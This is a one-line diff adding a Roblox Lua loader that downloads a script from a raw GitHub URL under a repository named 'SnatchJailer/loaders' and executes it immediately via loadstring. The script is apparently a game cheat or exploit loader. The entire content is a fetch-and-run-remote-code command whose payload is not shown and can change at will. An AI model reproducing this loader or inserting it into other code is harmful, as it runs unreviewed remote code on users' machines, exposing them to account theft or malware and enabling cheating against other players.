@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/clean-crew-class-skins-spam1-e6eeymg3ih8cjt.lua"))()
